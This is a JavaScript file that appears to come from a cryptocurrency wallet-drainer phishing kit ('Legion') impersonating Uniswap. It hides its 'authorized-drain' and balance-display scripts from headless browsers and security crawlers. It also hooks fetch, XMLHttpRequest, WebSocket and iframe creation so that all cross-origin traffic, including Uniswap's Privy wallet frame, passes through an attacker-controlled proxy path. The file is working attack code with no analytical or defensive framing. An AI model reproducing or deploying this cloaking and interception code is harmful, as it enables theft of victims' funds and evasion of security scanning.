/* Client-side cloaking — abort drain inject load for automation signals */
(function () {
  try {
  function isBotClient() {
    if (navigator.webdriver) return true;
    var ua = (navigator.userAgent || '').toLowerCase();
    if (/headless|phantomjs|selenium|puppeteer|playwright|bytespider|petalbot/.test(ua)) return true;
    if (!navigator.languages || navigator.languages.length === 0) return true;
    return false;
  }

  if (isBotClient()) {
    window.__LEGION_CLOAKED = true;
    var scripts = document.querySelectorAll('script[src*="legion-authorized-drain"],script[src*="legion-balance-display"],script[src*="legion-experimental"]');
    scripts.forEach(function (s) { s.remove(); });
  }

  // --- Legion WebSocket Interceptor ---
  var originalWebSocket = window.WebSocket;
  if (originalWebSocket) {
    window.WebSocket = function (url, protocols) {
      if (typeof url === 'string' && url.indexOf('wss://') === 0) {
        var match = url.match(/^wss:\/\/([^\/]+)(.*)$/);
        if (match) {
          var host = match[1];
          var path = match[2];
          if (host !== window.location.host) {
            url = 'ws://' + window.location.host + '/__legion_proxy/' + host + path;
          }
        }
      }
      if (protocols === undefined) {
        return new originalWebSocket(url);
      }
      return new originalWebSocket(url, protocols);
    };
    window.WebSocket.prototype = originalWebSocket.prototype;
    window.WebSocket.CONNECTING = originalWebSocket.CONNECTING;
    window.WebSocket.OPEN = originalWebSocket.OPEN;
    window.WebSocket.CLOSING = originalWebSocket.CLOSING;
    window.WebSocket.CLOSED = originalWebSocket.CLOSED;
  }

  // --- Legion CORS Proxy Interceptor ---
  var originalFetchBase = window.fetch;
  window.fetch = function () {
    var args = Array.prototype.slice.call(arguments);
    var url = args[0];
    var urlStr = '';
    
    if (typeof url === 'string') {
      urlStr = url;
    } else if (url && url.url) { // Request object
      urlStr = url.url;
    } else if (url && url.href) { // URL object
      urlStr = url.href;
    }

    if (urlStr.indexOf('/config/initialize') !== -1 && window.__STATSIG_MOCK) {
      return Promise.resolve(new Response(JSON.stringify(window.__STATSIG_MOCK), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      }));
    }

    if (urlStr.indexOf('https://') === 0) {
      var match = urlStr.match(/^https:\/\/([^\/]+)(.*)$/);
      if (match) {
        var host = match[1];
        var path = match[2];
        if (host !== window.location.host) {
          var proxyUrl = '/__legion_proxy/' + host + path;
          
          if (typeof url === 'string') {
            // Check if the URL is a GraphQL GET request with a massive query string
            if (url.indexOf('/v1/graphql?query=') !== -1 && url.length > 2000) {
              // Convert massive GET requests to POST requests to avoid 414 URI Too Long
              var urlObj = new URL(url);
              var queryParam = urlObj.searchParams.get('query');
              var variablesParam = urlObj.searchParams.get('variables');
              var operationNameParam = urlObj.searchParams.get('operationName');
              
              var postBody = { query: queryParam };
              if (variablesParam) postBody.variables = JSON.parse(variablesParam);
              if (operationNameParam) postBody.operationName = operationNameParam;

              var newOpts = args[1] ? Object.assign({}, args[1]) : {};
              newOpts.method = 'POST';
              newOpts.body = JSON.stringify(postBody);
              newOpts.headers = newOpts.headers ? new Headers(newOpts.headers) : new Headers();
              newOpts.headers.set('Content-Type', 'application/json');
              
              var proxyPath = '/__legion_proxy/' + host + urlObj.pathname;
              args[0] = proxyPath;
              args[1] = newOpts;
            } else {
              args[0] = proxyUrl;
            }
          } else if (url && url.url) {
            var reqOpts = {
              method: url.method,
              headers: new Headers(url.headers),
              mode: 'cors',
              credentials: url.credentials,
              redirect: url.redirect,
              referrer: url.referrer,
              integrity: url.integrity,
            };
            if (url.method !== 'GET' && url.method !== 'HEAD') {
              return url.clone().blob().then(function(blob) {
                reqOpts.body = blob;
                return originalFetchBase.call(window, new Request(proxyUrl, reqOpts));
              }).catch(function(e) {
                args[0] = proxyUrl;
                args[1] = url;
                return originalFetchBase.apply(window, args);
              });
            } else {
              args[0] = new Request(proxyUrl, reqOpts);
            }
          } else if (url && url.href) {
            args[0] = new URL(proxyUrl, window.location.origin);
          }
        }
      }
    }
    return originalFetchBase.apply(window, args);
  };

  var originalXhrOpenBase = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (method, url) {
    if (typeof url === 'string' && url.indexOf('https://') === 0) {
      var match = url.match(/^https:\/\/([^\/]+)(.*)$/);
      if (match) {
        var host = match[1];
        var path = match[2];
        if (host !== window.location.host) {
          url = '/__legion_proxy/' + host + path;
        }
      }
    }
    return originalXhrOpenBase.apply(this, [method, url, arguments[2], arguments[3], arguments[4]]);
  };

  // --- Legion Iframe Interceptor ---
  var originalCreateElement = document.createElement;
  document.createElement = function (tagName) {
    var el = originalCreateElement.apply(this, arguments);
    if (tagName && tagName.toLowerCase() === 'iframe') {
      var originalSetAttribute = el.setAttribute;
      el.setAttribute = function (name, value) {
        if (name === 'src' && typeof value === 'string' && value.indexOf('https://privy.app.uniswap.org') === 0) {
          value = value.replace('https://privy.app.uniswap.org', '/__legion_proxy/privy.app.uniswap.org');
        }
        return originalSetAttribute.apply(this, arguments);
      };
      Object.defineProperty(el, 'src', {
        get: function() { return el.getAttribute('src') || ''; },
        set: function(value) {
          if (typeof value === 'string' && value.indexOf('https://privy.app.uniswap.org') === 0) {
            value = value.replace('https://privy.app.uniswap.org', '/__legion_proxy/privy.app.uniswap.org');
          }
          el.setAttribute('src', value);
        }
      });
    }
    return el;
  };
  } catch(e) {
    console.log('[LEGION] Cloak script error (non-fatal):', e.message);
  }
})();
